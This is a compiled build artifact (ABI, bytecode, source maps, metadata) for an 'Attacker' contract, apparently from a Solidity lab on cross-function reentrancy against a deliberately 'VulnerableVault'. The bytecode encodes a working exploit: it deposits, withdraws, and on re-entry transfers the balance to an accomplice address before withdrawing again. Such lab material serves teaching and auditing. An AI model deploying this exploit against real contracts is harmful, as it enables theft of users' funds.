{"abi":[{"type":"constructor","inputs":[{"name":"_vault","type":"address","internalType":"address"},{"name":"_accomplice","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"accomplice","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackStep","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract VulnerableVault"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b5060405161074e38038061074e83398181016040528101906100319190610115565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610153565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b6100f4816100da565b81146100fe575f5ffd5b50565b5f8151905061010f816100eb565b92915050565b5f5f6040838503121561012b5761012a6100b7565b5b5f61013885828601610101565b925050602061014985828601610101565b9150509250929050565b6105ee806101605f395ff3fe60806040526004361061004d575f3560e01c806312065fe0146101965780637a164584146101c05780639e5faafc146101ea578063d12fd49a146101f4578063fbfa77cf1461021e57610192565b36610192575f600254036101905760016002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040518363ffffffff1660e01b81526004016100e792919061046d565b5f604051808303815f87803b1580156100fe575f5ffd5b505af1158015610110573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610179575f5ffd5b505af115801561018b573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156101a1575f5ffd5b506101aa610248565b6040516101b791906104a3565b60405180910390f35b3480156101cb575f5ffd5b506101d461024f565b6040516101e191906104a3565b60405180910390f35b6101f2610255565b005b3480156101ff575f5ffd5b5061020861039a565b60405161021591906104bc565b60405180910390f35b348015610229575f5ffd5b506102326103bf565b60405161023f9190610527565b60405180910390f35b5f47905090565b60025481565b670de0b6b3a76400003410156102a0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102979061059a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610306575f5ffd5b505af1158015610318573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610382575f5ffd5b505af1158015610394573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61040c826103e3565b9050919050565b61041c81610402565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61045761045261044d84610422565b610434565b61042b565b9050919050565b6104678161043d565b82525050565b5f6040820190506104805f830185610413565b61048d602083018461045e565b9392505050565b61049d8161042b565b82525050565b5f6020820190506104b65f830184610494565b92915050565b5f6020820190506104cf5f830184610413565b92915050565b5f6104ef6104ea6104e5846103e3565b610434565b6103e3565b9050919050565b5f610500826104d5565b9050919050565b5f610511826104f6565b9050919050565b61052181610507565b82525050565b5f60208201905061053a5f830184610518565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120657468657200000000000000000000005f82015250565b5f610584601583610540565b915061058f82610550565b602082019050919050565b5f6020820190508181035f8301526105b181610578565b905091905056fea264697066735822122087682d69c3d023f64042c5ab7f21995fd864a7cbd11fa04220cb74297ae94af364736f6c63430008210033","sourceMap":"90:943:19:-:0;;;211:131;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;294:6;270:5;;:31;;;;;;;;;;;;;;;;;;324:11;311:10;;:24;;;;;;;;;;;;;;;;;;211:131;;90:943;;88:117:22;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:507::-;924:6;932;981:2;969:9;960:7;956:23;952:32;949:119;;;987:79;;:::i;:::-;949:119;1107:1;1132:64;1188:7;1179:6;1168:9;1164:22;1132:64;:::i;:::-;1122:74;;1078:128;1245:2;1271:64;1327:7;1318:6;1307:9;1303:22;1271:64;:::i;:::-;1261:74;;1216:129;845:507;;;;;:::o;90:943:19:-;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x60806040526004361061004d575f3560e01c806312065fe0146101965780637a164584146101c05780639e5faafc146101ea578063d12fd49a146101f4578063fbfa77cf1461021e57610192565b36610192575f600254036101905760016002819055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a76400006040518363ffffffff1660e01b81526004016100e792919061046d565b5f604051808303815f87803b1580156100fe575f5ffd5b505af1158015610110573d5f5f3e3d5ffd5b505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610179575f5ffd5b505af115801561018b573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b3480156101a1575f5ffd5b506101aa610248565b6040516101b791906104a3565b60405180910390f35b3480156101cb575f5ffd5b506101d461024f565b6040516101e191906104a3565b60405180910390f35b6101f2610255565b005b3480156101ff575f5ffd5b5061020861039a565b60405161021591906104bc565b60405180910390f35b348015610229575f5ffd5b506102326103bf565b60405161023f9190610527565b60405180910390f35b5f47905090565b60025481565b670de0b6b3a76400003410156102a0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102979061059a565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610306575f5ffd5b505af1158015610318573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610382575f5ffd5b505af1158015610394573d5f5f3e3d5ffd5b50505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61040c826103e3565b9050919050565b61041c81610402565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61045761045261044d84610422565b610434565b61042b565b9050919050565b6104678161043d565b82525050565b5f6040820190506104805f830185610413565b61048d602083018461045e565b9392505050565b61049d8161042b565b82525050565b5f6020820190506104b65f830184610494565b92915050565b5f6020820190506104cf5f830184610413565b92915050565b5f6104ef6104ea6104e5846103e3565b610434565b6103e3565b9050919050565b5f610500826104d5565b9050919050565b5f610511826104f6565b9050919050565b61052181610507565b82525050565b5f60208201905061053a5f830184610518565b92915050565b5f82825260208201905092915050565b7f4e656564206174206c65617374203120657468657200000000000000000000005f82015250565b5f610584601583610540565b915061058f82610550565b602082019050919050565b5f6020820190508181035f8301526105b181610578565b905091905056fea264697066735822122087682d69c3d023f64042c5ab7f21995fd864a7cbd11fa04220cb74297ae94af364736f6c63430008210033","sourceMap":"90:943:19:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;584:1;570:10;;:15;566:354;;614:1;601:10;:14;;;;766:5;;;;;;;;;;;:14;;;781:10;;;;;;;;;;;793:7;766:35;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;893:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;566:354;90:943;;;;;932:99;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;179:25;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;348:175;;;:::i;:::-;;148:25;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;114:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;932:99;977:7;1003:21;996:28;;932:99;:::o;179:25::-;;;;:::o;348:175::-;414:7;401:9;:20;;393:54;;;;;;;;;;;;:::i;:::-;;;;;;;;;457:5;;;;;;;;;;;:13;;;478:9;457:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;500:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;348:175::o;148:25::-;;;;;;;;;;;;;:::o;114:28::-;;;;;;;;;;;;;:::o;7:126:22:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:103::-;428:7;457:5;446:16;;365:103;;;:::o;474:77::-;511:7;540:5;529:16;;474:77;;;:::o;557:60::-;585:3;606:5;599:12;;557:60;;;:::o;623:194::-;699:9;732:79;750:60;759:50;803:5;759:50;:::i;:::-;750:60;:::i;:::-;732:79;:::i;:::-;719:92;;623:194;;;:::o;823:183::-;936:63;993:5;936:63;:::i;:::-;931:3;924:76;823:183;;:::o;1012:384::-;1159:4;1197:2;1186:9;1182:18;1174:26;;1210:71;1278:1;1267:9;1263:17;1254:6;1210:71;:::i;:::-;1291:98;1385:2;1374:9;1370:18;1361:6;1291:98;:::i;:::-;1012:384;;;;;:::o;1402:118::-;1489:24;1507:5;1489:24;:::i;:::-;1484:3;1477:37;1402:118;;:::o;1526:222::-;1619:4;1657:2;1646:9;1642:18;1634:26;;1670:71;1738:1;1727:9;1723:17;1714:6;1670:71;:::i;:::-;1526:222;;;;:::o;1754:::-;1847:4;1885:2;1874:9;1870:18;1862:26;;1898:71;1966:1;1955:9;1951:17;1942:6;1898:71;:::i;:::-;1754:222;;;;:::o;1982:142::-;2032:9;2065:53;2083:34;2092:24;2110:5;2092:24;:::i;:::-;2083:34;:::i;:::-;2065:53;:::i;:::-;2052:66;;1982:142;;;:::o;2130:126::-;2180:9;2213:37;2244:5;2213:37;:::i;:::-;2200:50;;2130:126;;;:::o;2262:151::-;2337:9;2370:37;2401:5;2370:37;:::i;:::-;2357:50;;2262:151;;;:::o;2419:181::-;2531:62;2587:5;2531:62;:::i;:::-;2526:3;2519:75;2419:181;;:::o;2606:272::-;2724:4;2762:2;2751:9;2747:18;2739:26;;2775:96;2868:1;2857:9;2853:17;2844:6;2775:96;:::i;:::-;2606:272;;;;:::o;2884:169::-;2968:11;3002:6;2997:3;2990:19;3042:4;3037:3;3033:14;3018:29;;2884:169;;;;:::o;3059:171::-;3199:23;3195:1;3187:6;3183:14;3176:47;3059:171;:::o;3236:366::-;3378:3;3399:67;3463:2;3458:3;3399:67;:::i;:::-;3392:74;;3475:93;3564:3;3475:93;:::i;:::-;3593:2;3588:3;3584:12;3577:19;;3236:366;;;:::o;3608:419::-;3774:4;3812:2;3801:9;3797:18;3789:26;;3861:9;3855:4;3851:20;3847:1;3836:9;3832:17;3825:47;3889:131;4015:4;3889:131;:::i;:::-;3881:139;;3608:419;;;:::o","linkReferences":{}},"methodIdentifiers":{"accomplice()":"d12fd49a","attack()":"9e5faafc","attackStep()":"7a164584","getBalance()":"12065fe0","vault()":"fbfa77cf"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.33+commit.64118f21\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vault\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_accomplice\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"accomplice\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackStep\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"contract VulnerableVault\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/02-cross-function-reentrancy/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[\":forge-std/=lib/forge-std/src/\"]},\"sources\":{\"src/02-cross-function-reentrancy/Attacker.sol\":{\"keccak256\":\"0x818031fb0a58a719524f453771731532dbb520d37334dab7ddb90c03bfa9106c\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://266b5f26c1f86fa8db5cebc746fec6d81d41c601944b347d671f95dcafc93a66\",\"dweb:/ipfs/QmVc3LnyM2ygzB4AEKoj3rcQWdb1txDzCYsYXjNeACjoZY\"]},\"src/02-cross-function-reentrancy/VulnerableVault.sol\":{\"keccak256\":\"0x41eeb40f976d8d37d60ae947ddbf9e4ef28736803a6a155ba7568a17642b78df\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://00fbc44fd883c27467aa26d69a81e608636b377d0e2ef69384485499b56cadf6\",\"dweb:/ipfs/QmQW5MkWTkQ29YCEromebU5ifpXxxZktYjyHrDTViXCHkE\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.33+commit.64118f21"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_vault","type":"address"},{"internalType":"address","name":"_accomplice","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"accomplice","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"attackStep","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"vault","outputs":[{"internalType":"contract VulnerableVault","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/02-cross-function-reentrancy/Attacker.sol":"Attacker"},"evmVersion":"prague","libraries":{}},"sources":{"src/02-cross-function-reentrancy/Attacker.sol":{"keccak256":"0x818031fb0a58a719524f453771731532dbb520d37334dab7ddb90c03bfa9106c","urls":["bzz-raw://266b5f26c1f86fa8db5cebc746fec6d81d41c601944b347d671f95dcafc93a66","dweb:/ipfs/QmVc3LnyM2ygzB4AEKoj3rcQWdb1txDzCYsYXjNeACjoZY"],"license":"MIT"},"src/02-cross-function-reentrancy/VulnerableVault.sol":{"keccak256":"0x41eeb40f976d8d37d60ae947ddbf9e4ef28736803a6a155ba7568a17642b78df","urls":["bzz-raw://00fbc44fd883c27467aa26d69a81e608636b377d0e2ef69384485499b56cadf6","dweb:/ipfs/QmQW5MkWTkQ29YCEromebU5ifpXxxZktYjyHrDTViXCHkE"],"license":"MIT"}},"version":1},"id":19}